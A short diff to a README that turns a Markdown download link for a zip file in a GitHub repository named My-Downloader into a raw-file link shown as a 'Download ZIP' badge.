@@ -22,7 +22,9 @@
 
 Click below to download the zip directly:
 
-👉 **[Download zip](https://github.com/Y2m777a5/My-Downloader/blob/main/My%20Downloder.zip)**
+<a href="https://github.com/Y2m777a5/My-Downloader/raw/main/My Downloder.zip">
+  <img src="https://img.shields.io/badge/Download-ZIP-blue?style=for-the-badge&logo=github" alt="Download ZIP">
+</a>
 
 <div align="center">
   
